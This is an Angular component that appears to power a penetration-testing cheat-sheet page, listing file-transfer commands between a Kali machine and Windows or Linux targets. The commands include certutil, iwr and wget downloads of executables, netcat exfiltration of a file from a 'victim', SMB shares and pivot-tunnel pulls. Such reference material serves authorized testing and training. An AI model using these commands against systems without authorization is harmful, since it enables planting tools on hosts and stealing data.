import { Component, DestroyRef, OnInit, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { MatExpansionModule } from '@angular/material/expansion';
import { ActivatedRoute, Router } from '@angular/router';
import { takeUntilDestroyed } from '@angular/core/rxjs-interop';
import { Terminal } from '../../shared/terminal/terminal';
import { SectionIndexComponent, SectionIndexItem } from '../../shared/components/section-index/section-index';

interface TransferCommandBlock {
  context: string;
  command: string;
}

interface TransferMethod {
  title: string;
  description: string;
  commands: TransferCommandBlock[];
}

@Component({
  selector: 'app-useful-stuff',
  standalone: true,
  imports: [CommonModule, MatExpansionModule, Terminal, SectionIndexComponent],
  templateUrl: './useful-stuff.html',
  styleUrl: './useful-stuff.scss'
})
export class UsefulStuffComponent implements OnInit {
  selectedSection = 'file-transfer';
  readonly sections: SectionIndexItem[] = [
    { id: 'file-transfer', label: 'File Transfer', group: 'Transfers' }
  ];

  private readonly route = inject(ActivatedRoute);
  private readonly router = inject(Router);
  private readonly destroyRef = inject(DestroyRef);

  ngOnInit(): void {
    this.route.queryParamMap
      .pipe(takeUntilDestroyed(this.destroyRef))
      .subscribe(params => {
        const section = params.get('section');
        if (section && this.sections.some(item => item.id === section)) {
          this.selectedSection = section;
        }
      });
  }

  selectSection(section: string): void {
    this.selectedSection = section;
    void this.router.navigate([], {
      relativeTo: this.route,
      queryParams: { section },
      replaceUrl: true
    });
  }

  readonly transferMethods: TransferMethod[] = [
    {
      title: 'HTTP: Kali to Windows',
      description: 'Serve files from Kali, then download them from the Windows host.',
      commands: [
        {
          context: 'On Kali',
          command: 'python3 -m http.server {{LOCAL_PORT}} --bind 0.0.0.0'
        },
        {
          context: 'On Windows',
          command: `certutil -urlcache -split -f http://{{LOCAL_IP}}:{{LOCAL_PORT}}/file.exe file.exe
iwr http://{{LOCAL_IP}}:{{LOCAL_PORT}}/file.exe -OutFile file.exe
curl.exe -f http://{{LOCAL_IP}}:{{LOCAL_PORT}}/file.exe -o file.exe`
        }
      ]
    },
    {
      title: 'SMB: Kali to Windows and Windows to Kali',
      description: 'Use a writable SMB share on Kali to copy files in either direction.',
      commands: [
        {
          context: 'On Kali: serve the current directory as a share',
          command: 'impacket-smbserver share . -smb2support -username kali -password kali'
        },
        {
          context: 'On Windows: upload a local file to the Kali share',
          command: `net use \\\\{{LOCAL_IP}}\\share /user:kali kali
copy file.exe \\\\{{LOCAL_IP}}\\share\\`
        },
        {
          context: 'On Windows: download a file from the Kali share',
          command: 'copy \\\\{{LOCAL_IP}}\\share\\file.exe file.exe'
        }
      ]
    },
    {
      title: 'Netcat: victim to Kali',
      description: 'Transfer a file over a TCP connection. Allow the chosen port through the host firewall when required.',
      commands: [
        {
          context: 'On Kali: receive the file',
          command: 'nc -lvnp {{LOCAL_PORT}} > file.bin'
        },
        {
          context: 'On the victim: send the file',
          command: 'nc {{LOCAL_IP}} {{LOCAL_PORT}} < file.bin'
        }
      ]
    },
    {
      title: 'HTTP: Kali to Linux',
      description: 'Use wget or curl on the Linux host to pull a file from Kali.',
      commands: [
        {
          context: 'On Kali',
          command: 'python3 -m http.server {{LOCAL_PORT}} --bind 0.0.0.0'
        },
        {
          context: 'On the Linux host',
          command: `wget http://{{LOCAL_IP}}:{{LOCAL_PORT}}/file.sh -O file.sh
curl -f http://{{LOCAL_IP}}:{{LOCAL_PORT}}/file.sh -o file.sh`
        }
      ]
    },
    {
      title: 'SCP: either direction over SSH',
      description: 'Use when SSH is available and credentials or keys are authorized.',
      commands: [
        {
          context: 'From Kali to the Linux target',
          command: 'scp file user@{{TARGET_IP}}:/tmp/'
        },
        {
          context: 'From the Linux target to Kali',
          command: 'scp user@{{TARGET_IP}}:/tmp/file .'
        }
      ]
    },
    {
      title: 'Base64: fallback without transfer tools',
      description: 'Encode the file, copy the output in manageable chunks, then decode it on the other host.',
      commands: [
        {
          context: 'On the source host: encode the file',
          command: 'base64 file.bin'
        },
        {
          context: 'On the destination: paste chunks into file.b64, then decode',
          command: `echo 'BASE64_CONTENT' >> file.b64
base64 -d file.b64 > file.bin`
        }
      ]
    },
    {
      title: 'FTP: quick transfer',
      description: 'Start a temporary FTP server on Kali and connect from the target. Use only on an isolated, authorized lab network.',
      commands: [
        {
          context: 'On Kali',
          command: 'sudo python3 -m pyftpdlib -p {{LOCAL_PORT}}'
        },
        {
          context: 'On the target: connect, then use get or put in the FTP prompt',
          command: 'ftp {{LOCAL_IP}} {{LOCAL_PORT}}'
        }
      ]
    },
    {
      title: 'Through a pivot or tunnel',
      description: 'For an internal host, Local IP must be the reachable tunnel interface address (for example, the Ligolo interface), not the public Kali address.',
      commands: [
        {
          context: 'On Kali: bind the temporary HTTP server to all interfaces',
          command: 'python3 -m http.server {{LOCAL_PORT}} --bind 0.0.0.0'
        },
        {
          context: 'On the internal Linux host: pull through the established route',
          command: 'wget http://{{LOCAL_IP}}:{{LOCAL_PORT}}/file.sh -O file.sh'
        }
      ]
    },
    {
      title: 'Quick picks and integrity check',
      description: 'Choose a method available in the engagement scope, then verify the transferred file when possible.',
      commands: [
        {
          context: 'Quick picks',
          command: `Windows with PowerShell: iwr or curl.exe
Windows without PowerShell: certutil
Linux: wget or curl
SSH available: scp
SMB share writable: copy to the share
No transfer utility: base64 chunks`
        },
        {
          context: 'Compare hashes on source and destination',
          command: `sha256sum file.bin
Get-FileHash file.bin -Algorithm SHA256`
        }
      ]
    }
  ];
}